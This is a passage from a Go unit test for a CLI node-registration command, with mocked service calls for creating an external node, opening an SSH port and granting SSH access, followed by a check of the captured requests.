						ExternalNode: &nodev1.ExternalNode{
							ExternalNodeId: "unode_abc",
							OrganizationId: "org_123",
							Name:           req.GetName(),
							DeviceId:       req.GetDeviceId(),
							ConnectivityInfo: &nodev1.ConnectivityInfo{
								RegistrationCommand: "netbird up --key abc",
							},
						},
					}, nil
				},
				openPortFn: func(req *nodev1.OpenPortRequest) (*nodev1.OpenPortResponse, error) {
					gotOpenReq = req
					if tt.openFn != nil {
						return tt.openFn(req)
					}
					return &nodev1.OpenPortResponse{
						Port: &nodev1.Port{PortId: "port_ssh", Protocol: req.GetProtocol(), PortNumber: req.GetPortNumber()},
					}, nil
				},
				grantNodeSSHAccessFn: func(req *nodev1.GrantNodeSSHAccessRequest) (*nodev1.GrantNodeSSHAccessResponse, error) {
					gotGrantReq = req
					return &nodev1.GrantNodeSSHAccessResponse{}, nil
				},
			}

			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			deps.prompter = mockConfirmer{confirm: true}

			SetTestSSHPort(tt.port)
			defer ClearTestSSHPort()

			term := terminal.New()
			opts := registerOpts{interactive: false, name: "my-spark", orgName: "TestOrg", sshPort: tt.port}
			err := runRegister(context.Background(), term, store, opts, deps)

			tt.verify(t, gotOpenReq, gotGrantReq, regStore, err)
		})
	}
}
